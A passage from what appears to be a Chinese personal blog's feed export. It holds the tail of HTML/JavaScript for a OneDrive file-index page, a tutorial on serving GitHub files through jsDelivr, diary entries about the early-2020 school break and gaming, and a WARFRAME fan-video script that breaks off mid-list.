class="literal">null</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">headers</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">const</span> accessToken = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">accessToken</span> = &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">encrypted</span>: accessToken.<span class="property">encrypted</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">plain</span>: accessToken.<span class="property">plain</span></span></span><br><span class="line"><span class="language-javascript">                        &#125;;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">fetchFileList</span>(initialPath);</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">addBackForwardListener</span>();</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                );</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;tree-node-wrapper-template&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tree-node-wrapper&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tree-node&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ion-icon</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ion-icon</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tree-node-name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;file-wrapper-templete&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row file-wrapper&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ion-icon</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;time&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;size&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;loading-wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;loading&quot;</span>&gt;</span>Loading...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header-wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">id</span>=<span class="string">&quot;arrow-back&quot;</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> <span class="attr">name</span>=<span class="string">&quot;arrow-back&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">id</span>=<span class="string">&quot;arrow-forward&quot;</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> <span class="attr">name</span>=<span class="string">&quot;arrow-forward&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ion-icon</span> <span class="attr">id</span>=<span class="string">&quot;main-page&quot;</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> <span class="attr">name</span>=<span class="string">&quot;folder&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ion-icon</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;path&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;site&quot;</span> <span class="attr">id</span>=<span class="string">&quot;nav-site&quot;</span>&gt;</span>ONEDRIVE<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;tree-root&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-header&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;name&quot;</span>&gt;</span>ITEMS<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;time&quot;</span>&gt;</span>TIME<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;size&quot;</span>&gt;</span>SIZE<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;file-list&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;markdown-body&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;readme&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;preview&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;file-name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn download&quot;</span>&gt;</span>下载<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn quote&quot;</span>&gt;</span>引用<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn share&quot;</span>&gt;</span>分享<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;password-wrapper&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>完成界面：<br><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/FODI/Success.png" alt="cloudflare editor"></p><hr><p>题外话：</p><p>那个获取refresh_token的网页并不是不可用，但是成功率巨低，我试了前前后后三十多次才一次成功……</p><p>heroku的登录需要科学上网，怎么科学上网就不要问我了，Google上大把……</p><p>以后发文件我会放到我的onedrive上，大家可以自取，地址是<a href="http://drive.bili33.top/">http://drive.bili33.top/</a>，友链页面也有链接。</p><p>我自己部署的heroku项目不会开放给大家获取refresh_token，因为获取完一次要到后台删除refresh_token才能进行下一次的获取</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsDelivr的正确打开方式</title>
      <link href="/posts/jsDelivr-Usage/"/>
      <url>/posts/jsDelivr-Usage/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note info flat"><p>文章已经在2020.4.5更新</p></div><p><del>开始持续高产</del>前几天开始，github的raw文件下载域名<code>raw.githubusercontent.com</code>被墙了，导致我的网站很多图片都是404（因为我是直接使用github的文件），我转为使用cloudflare的workers反代。但是反代有每日10W次的请求次数限制。<del>万一以后我的网站访问量增大了呢？这样岂不是不够用？</del>（在想Peach）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/jsDelivr/Chiyota-momo.jpg" alt="没错，我在想もも"></p><p>今天早上我才在<a href="/2020/02/06/diary4/">【日常吐槽04】</a>的评论区里面说不会用jsDelivr，到了晚上，嗯，真香……</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/jsDelivr/home.png" alt="jsDelivr"></p><p>jsDelivr是一个比较好的CDN平台，官方号称<code>jsDelivr – Open Source CDN</code> <code>free, fast, and reliable</code>，简单来说就是开源的CDN，免费、快、可靠这样的</p><p>不过确实，这玩意的口碑也挺好，那我就按照我半天的使用体验，来说说这玩意的正确打开方式吧</p><hr><h3 id="你需要准备："><a href="#你需要准备：" class="headerlink" title="你需要准备："></a>你需要准备：</h3><p>一个github账号</p><h3 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h3><p>你需要登录你的Github，创建一个你想用来放文件的仓库，然后在这个仓库里面上传你的文件，像我这样</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/jsDelivr/Picture-repo.png" alt="上传文件后的仓库"></p><p>然后点击Release，新建一个版本，在上面的小方框里面填写你的版本号，尽量填写数字，例如<code>1.0</code>之类的，不要用中文！！！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/jsDelivr/release.png" alt="新建Release"></p><p>接着直接调用jsDelivr，例如我在名为Picture-repo的仓库发布了1.0版本，那么我访问链接：</p><p><code>https://cdn.bili33.top/gh/Vikutorika/assets@master/AboutMe/logo-mini.png</code></p><p>就可以直接调用我的头像，按照官方的格式，就是</p><p><code>https://cdn.jsdelivr.net/gh/&lt;username&gt;/&lt;repo-name&gt;@&lt;version&gt;/&lt;path&gt;</code></p><p>的样子，解释一下：</p><p>&lt;username&gt;就改成自己的名字，&lt;repo-name&gt;改成自己的仓库名字，&lt;version&gt;就是你的release版本，如果不填会自动选择最新的release&lt;path&gt;改成自己的文件路径。当我上传的时候我的文件夹路径是<code>.\folder\example.png</code>的话，那么&lt;path&gt;就要改成<code>folder/example.png</code></p><p>但是请注意！当你的release包大于50MB，那么jsdelivr会给你报错并且不给你提供加速服务，例如下面这条链接:</p><p><a href="https://cdn.jsdelivr.net/gh/NotFoundNEKKO/Storage@1.0/%E8%A1%A8%E6%83%85%E5%8C%85/%E7%9C%9F%E5%8F%AB%E4%BA%BA%E8%B4%A8%E5%A3%81%E5%88%86%E7%A6%BB.jpg">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;NotFoundNEKKO&#x2F;Storage@1.0/表情包/真叫人质壁分离.jpg</a></p><p>点开就会发现提示：</p><p><code>Package size exceeded the configured limit of 50 MB. Try https://github.com/NotFoundNEKKO/Storage/tree/1.0/表情包/真叫人质壁分离.jpg instead.</code></p><p>所以说还是要尽量减少自己每个release的大小，如果说太大了建议分成几个仓库放哦~</p><div class="note success flat"><p>从群友那里学来的：当你的版本号写为master时，只需要第一次发布release即可，后面直接用master分支的文件，也没有50MB的文件包大小限制</p></div><hr><div class="note info flat"><h3 id="2020-4-5-更新：Github-Page法"><a href="#2020-4-5-更新：Github-Page法" class="headerlink" title="2020.4.5 更新：Github Page法"></a>2020.4.5 更新：Github Page法</h3></div><p>根据评论区@Anonymous的回复，发现有另外一种方式也能够访问Github中的文件（而且还是raw）</p><p>我们还是以上面那个仓库为例子，先到仓库中的设置，打开Github Pages服务</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@jsdelivr-usage/img/jsdelivr-Usage/Picture-repo-Pages.png" alt="打开Github Pages服务"></p><p>然后我们可以看到Github将我的这个仓库的page服务部署到了<code>https://bili33.top/Picture-repo/</code>这个链接</p><p>我们尝试访问仓库中的文件</p><p>在这里我访问的是我的网站头图↓</p><p><img src="https://bili33.top/Picture-repo/img/Top-img/NEKO-Hackers.jpg" alt="网站头图（以Page方式加载）"></p><p>可以看到，的确是可以进行访问的。而如果在Github Pages服务中开启自定义域名的话，还能够配合CloudFlare的CDN进行一波加<del>（jian）</del>速</p><p><img src="https://gamernotitle.coding.net/p/BQB/d/BQB/git/raw/master/001Funny_%E6%BB%91%E7%A8%BD%E5%A4%A7%E4%BD%AC%F0%9F%98%8FBQB/Funny00008.gif"></p><hr><p>题外话：</p><p>但是还是有人要直接访问raw.githubusercontent.com域名，所以我在这里开放出我的反代</p><p>当你访问了域名为raw.githubusercontent.com的文件后（后面应该有一大串的文件路径链接），把它改成下面任意一个域名</p><p><code>反代1：cdn.bili33.top</code>（每日请求上限较少，因为我的反代都在这里）</p><p><code>反代2：bilicdn.tk</code>（推荐）</p><p>希望能够帮到大家吧~</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常吐槽04</title>
      <link href="/posts/diary4/"/>
      <url>/posts/diary4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最近甚是无聊，因为做完了作业又不能出门（这都要从一只蝙蝠说起……），天天在家里打命(tu)运(ming)2，在家里躺着都算给国家做贡献……也没干什么技术活，就还是来吐槽一下吧</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary/04/origin.jpg" width="256" height="364.8"></img></p><p>首先先感谢2019-ncov送来的寒假延长消息，让我们的寒假至少延迟到了2020.2.17（原来是9号回校，10号正式开学），也让我肝土命2的时间变多了（这赛季等级莫不是要冲100，正因如此，周末双休可能就要变成单休了，而且准高三的暑假估计要被阉割掉了）。因为病毒的影响，导致人人不能出门，出门必戴口罩。因为口罩太畅销了，有些地方的口罩纷纷涨价。涨价一点点能接受对吧，但是我看到我们班上有人20买个医用口罩，真心贵……（强烈斥责坐地起价的行为）昨天早上还去排队买口罩，凭身份证一人买五个5￥，买完了还去别的地方看看有没有口罩买，最后十一点半回到家……</p><p><img src="https://cdn.jsdelivr.net/gh/NotFoundNEKKO/BQBTwT@1.0/真叫人质壁分离.jpg" width="300" height="300"></img></p><p>既然学校延迟开学，那也不能闲着，让学生开始用起了钉钉，想着用钉钉的会议模式上课（什么脑洞……）钉钉的商店评分骤降（XSWL），这算是躺枪_(:з」∠)_吧……但是也让钉钉首次超过微信拿到了iOS榜单第一（嘿嘿）</p><p><img src="https://cdn.jsdelivr.net/gh/NotFoundNEKKO/BQBTwT@1.0/嗯？.jpg" width="300" height="300"></img></p><p>最近特别喜欢用twitter（我也不知道为什么，我的Twitter<a href="https://twitter.com/GamerNoTitle">@GamerNoTitle</a>），天天早上就打开手机看推，然后看到@PlayWarframe（WARFRAME官方账号）关注了@Bungie（命运2开发商）和@Destiny2（命运2官方账号），这两家公司莫非有啥关系？？？（不过话说是同一题材的游戏撒）</p><p><img src="https://cdn.jsdelivr.net/gh/NotFoundNEKKO/BQBTwT@1.0/歪头.jpg" width="300" height="300"></img></p><p>15天前，我在Valine-Admin的仓库发布了issue<a href="https://github.com/DesertsP/Valine-Admin/issues/75">#75</a>，主要是邮件的发送上的问题，直到今天，终于有人回复我啦^v^，感谢大佬**<a href="https://github.com/tnrzy">@tnrzy</a>**帮我解决了邮件发送的问题*v*</p><p><img src="https://camo.githubusercontent.com/5f08fd71196a826d3a7efee0b526eab78aec658b/68747470733a2f2f63646e2e62696c6933332e746f702f4e6f74466f756e644e454b4b4f2f53746f726167652f6d61737465722f2545382541312541382545362538332538352545352538432538352f2545382542302541322545382542302541322545372538422542382545372538432541422e6a7067"></p><p>前几天还是在刷Twitter的时候，想去Soundcloud上听大佬的歌曲，然后发现国内访问不了Soundcloud，而且用cloudflare反代也不行，我就只能翻墙上soundcloud了。话说到底为啥soundcloud不能在国内用？？？</p><p><img src="https://cdn.jsdelivr.net/gh/NotFoundNEKKO/BQBTwT@1.0/灵梦FL.jpg" width="300" height="350"></img></p><hr><p>近期想做的事情：</p><p>1、想玩VR！！！想玩Beat Saber！！！（没有VR的人哭了）</p><p>2、趁着现在闲，想继续学一下C++和Python（目前只会基础撒）</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常吐槽03 - 聊一聊WARFRAME COINCIDANCE的制作</title>
      <link href="/posts/diary3/"/>
      <url>/posts/diary3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>近期做了一个视频：<a href="https://www.bilibili.com/video/av84462179/">【WARFRAME 抖肩舞】星 际 仓 鼠 再来亿遍！打三傻不如跳舞！每天一遍，防止抑郁~ WARFRAME版 Coincidance 自制</a></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary/Coincidance.png" alt="WARFRAME COINCIDANCE"></p><p>什么？你说你还没有看？赶紧点开上面的蓝链前往B站查看！！！</p><p>哔哩哔哩播放：<a href="https://www.bilibili.com/video/av84462179/">【WARFRAME 抖肩舞】星 际 仓 鼠 再来亿遍！打三傻不如跳舞！每天一遍，防止抑郁~ WARFRAME版 Coincidance 自制</a></p><iframe src="//player.bilibili.com/player.html?aid=84462179&cid=144465868&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>YouTube播放：<iframe width="560" height="315" src="https://www.youtube.com/embed/aA3QgQMm4FE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>这是[bilibili@GamerNoTitle](https://space.bilibili.com/44666814)（也就是我自己）和[bilibili@ThisNEKKO_xd](https://space.bilibili.com/49835313/)、[bilibili@MI-rice-json](https://space.bilibili.com/22267745/)和[bilibili@毁天灭地的GEnX](https://space.bilibili.com/49914186/)四人一起合作完成的视频，这算是2019（农历）的最后一个视频，也是第一个视频。至于这个发布日期也是特意挑的，因为是我农历生日……<p>一开始想做这个是因为看到了这个<a href="https://www.bilibili.com/video/av80351178">【命运2 抖肩舞】再来亿遍！打游戏不如跳舞！每天一遍，防止抑郁~命运2版Coincidance 自制</a></p><p>没错，就是命（tu）运（ming）2版的Coincidance。其实这个视频我是在期末考试最后一天的中午在宿舍里面看的，因为我们的考试安排是这样的（如下表，忘了具体日期了，本人选科是全理科）↓</p><table><thead><tr><th>日期</th><th>场次</th><th>科目</th><th>时间</th></tr></thead><tbody><tr><td>第一天</td><td>1</td><td>语文</td><td>7:40~10:10</td></tr><tr><td>第一天</td><td>2</td><td>物理</td><td>10:30~11:45</td></tr><tr><td>第一天</td><td>3</td><td>政治（不考）</td><td>14:30~15:45</td></tr><tr><td>第二天</td><td>1</td><td>数学</td><td>8:00~10:00</td></tr><tr><td>第二天</td><td>2</td><td>生物</td><td>10:20~11:45</td></tr><tr><td>第二天</td><td>3</td><td>地理（不考）</td><td>14:30~15:45</td></tr><tr><td>第三天</td><td>1</td><td>英语</td><td>8:00~10:00</td></tr><tr><td>第三天</td><td>2</td><td>化学</td><td>10:20~11:45</td></tr><tr><td>第三天</td><td>3</td><td>历史（不考）</td><td>14:30~15:45</td></tr></tbody></table><p>也就是在第三天的中午，反正下午也不考试，我就掏出了手机，打开了B站，开始看了一中午的视频（在这天之前我从未掏出过手机！），然后就看到了这个视频。</p><p>这个视频也是我的各个好友不断分享，然后在前天（2020.1.20）的晚上，我突然想到“为啥我们不做一个自己的COINCIDANCE”？用WARFRAME来做呢？（因为WARFRAME较完善的动作系统）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Diary/WF-Me-Too.jpg" alt="给我也整一个 MOD"></p><p>然后我就在群里面找人，讲真，我身边加上我玩WARFRAME的人（就是身边的，不算上沙雕群友们）就只有4个人，而且WARFRAME刚好也是一个队伍最多4个人（这里我就要吐槽了，为什么不能像土命一样一个队伍6个人，这样更快乐，即使有5人小队BUG，但是不如土命2快乐），我们就相约第二天九点上线动工。</p><p>到了早上8点50分，我的手机闹铃就响了，<del>是标准的Pixel音效</del> 是在催促我起床了，我就赶紧起床，然后打开了WARFRAME。幸好我已经提前更新完了，要不都不知道要等多久。我打开了前一天晚上与<a href="https://space.bilibili.com/49835313/">@ThisNEKKO_xd</a>一起讨论修改的脚本打开，然后CALL上小队成员，进入Chaptcha（好像是这么叫的）摄影棚开始拍摄。</p><p>（下面先放出脚本）</p><hr><p>KIKI:Gamer.bili</p><p>ChuChu: Notfound404.</p><p>摄像机？（中间的人）：GodGenx</p><p>机动：UBIthepotato</p><p>第一幕：KIKI</p><p>KIKI走路（第一个仓鼠叫做kiki）</p><p>KIKI拍绝路（她手上的是8极化绝路 – 截图）</p><p>机动&amp;中间的人（不要和后面用一个甲）拳击（动作：洞悉武式）（她的车队喜拳击）</p><p>KIKI跳舞（但KIKI喜欢跳舞）</p><p>第二幕：ChooChoo</p><p>ChooChoo三弦琴（第二只仓鼠叫做ChooChoo，是一只？？的仓鼠）</p><p>ChooChoo子弹跳×2（她喜欢解救受难仓鼠，但更喜欢跳舞）</p><p>ChooChoo跳舞</p><p>第三幕：</p><p>KIKI子弹跳×1，走动  ChooChoo三弦琴（她们踏上了旅程）</p><p>飞船（去到各个星球）</p><p>KIKI&amp;ChooChoo处决&amp;砍怪（分开）（她们听从莲妈，成为了Tenno强盗）</p><p>第四幕：</p><p>KIKI中继站子弹跳（她们跑遍了宇宙）</p><p>ChooChoo&amp;NPC深鞠躬（遇到了许多的人）</p><p>七字真言弹出登录界面（无论是否有七字真言，她们都在跳舞）</p><p>KIKI跳舞  </p><p>ChooChoo跳舞</p><p>KIKI在NPC面前跳舞</p><p>第五幕：摄影棚中继站</p><p>四人加载界面&amp;四人进去不要动（一天她们到达了，宇宙的某个中继站）（加Hydroid中继站大字）</p><p>中间黑咖喱显赫刀剑疯狂长按E（她们俩肩并肩跳舞引来了其他仓鼠的围观）</p><p>KIKI&amp;ChooChoo转身（她们转身面对面）</p><p>Kiki&amp;ChooChoo跳舞（一切就在这巧合发生了）</p><p>KIKI鼓掌ChooChoo跳舞（Wow,跳的不错嘛）</p><p>KIKI跳舞ChooChoo鼓掌（Wow,你也不错嘛）</p><p>（He went dongdongdong, he went dongdongdong，They said we both been dance all this time）</p><p>KIKI&amp;ChooChoo转向镜头（同时）（What coincidance）</p><p>Kiki&amp;ChooChoo跳舞</p><p>▲注意一定要看下面</p><p>三个人（kiki&amp;ChooChoo&amp;机动）</p><p>Kiki左 机动中 ChooChoo右</p><p>1、 kiki&amp;ChooChoo跳</p><p>2、 三人跳</p><p>3、 机动跳</p><p>4、 三人跳</p><p>第六幕：多场景</p><p>1、（场景无所谓）两人跳（从此她们一起跳舞）</p><p>2、（塞防图）上下两人跳（在这之前没人像她们一样）</p><p>3、（去希图斯）四人跳舞步可不统一（整个小队都在跳舞）</p><p>4、（夜灵平野三傻面前）四人跳舞（没有人去欺负三傻）</p><p>5、（放大KIKI）（KIKI停下面对镜头）（NO MORE）</p><p>6、（金星平原蜘蛛前面）四人跳（整个小队一起跳舞跳到了金星平原）</p><p>第七幕：</p><p>Kiki&amp;ChooChoo同时跳（这都是因为两人的相遇，What a coincidence!）</p><p>很多镜头&amp;甲用于快闪 都是单独舞步跳两个轮回</p><p>机动 指挥家武式（Lets dance）</p><p>第八幕：</p><p>1、 （KIKI左 机动中（靠后） ChooChoo右）KIKI&amp;ChooChoo跳</p><p>2、 （KIKI左 机动中（靠前） ChooChoo右）（同上）</p><p>3、 （KIKI左 机动中（靠后） ChooChoo右）三人跳</p><p>4、 （KIKI左 机动中（靠前） ChooChoo右）（同上）</p><p>5、 （KIKI左 机动中（并排） ChooChoo右）三人跳</p><p>6、 （KIKI）KIKI跳</p><p>7、 （ChooChoo）ChooChoo跳</p><p>8、 （机动）</p><p>9、 （机动）蚀之武式</p><p>10、（机动&amp;摄影）</p><p>11、KIKI跳 机动左侧鼓掌</p><p>12、ChooChoo跳 